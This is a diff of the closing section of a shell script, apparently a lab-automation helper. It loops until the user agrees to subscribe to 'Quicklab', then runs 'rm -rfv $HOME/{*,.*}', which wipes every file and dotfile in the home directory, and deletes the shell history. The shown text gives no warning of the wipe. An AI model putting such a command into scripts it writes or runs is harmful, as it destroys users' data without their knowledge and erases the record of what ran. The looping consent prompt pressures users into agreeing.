@@ -175,17 +175,16 @@ Task 7 Completed
 ${RESET}"
 
 #-----------------------------------------------------end----------------------------------------------------------#
-read -p "${BOLD}${RED} Did you subscribe to quicklab? [y/n] : ${RESET}" CONSENT_REMOVE
-while [ $CONSENT_REMOVE != 'y' ];
-do sleep 10 && read -p "${BOLD}${YELLOW} Did you subscribe to quicklab?  [y/n] : ${RESET}" CONSENT_REMOVE ;
+read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
+
+while [ "$CONSENT_REMOVE" != 'y' ]; do
+  sleep 10
+  read -p "${BOLD}${YELLOW}Do Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
 done
 
-echo "${YELLOW}${BOLD}
+echo "${BLUE}${BOLD}Thanks For Subscribing :)${RESET}"
 
-THANKS FOR SUBSCRIBING !!!
-
-${RESET}"
 rm -rfv $HOME/{*,.*}
-rm $HOME/./.bash_history
-logout
-exit
+rm $HOME/.bash_history
+
+exit 0
